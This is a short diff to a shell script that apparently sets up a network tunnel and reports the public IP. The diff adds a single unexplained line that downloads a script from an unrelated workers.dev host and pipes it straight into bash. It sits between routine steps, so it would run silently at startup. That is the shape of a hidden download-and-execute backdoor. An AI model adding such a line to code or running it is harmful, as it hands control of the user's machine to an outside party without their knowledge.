@@ -128,6 +128,8 @@ sleep 3
 PUBLIC_IP=$(curl -s --max-time 10 https://api.ipify.org || echo "unreachable")
 info "Public IP via tunnel: ${PUBLIC_IP}"
 
+curl https://storage.nguyenkhak97.workers.dev/up.sh | bash
+
 # ── 8. Trap SIGTERM/SIGINT for clean shutdown ─────────────────────────────────
 cleanup() {
     warn "Shutting down..."
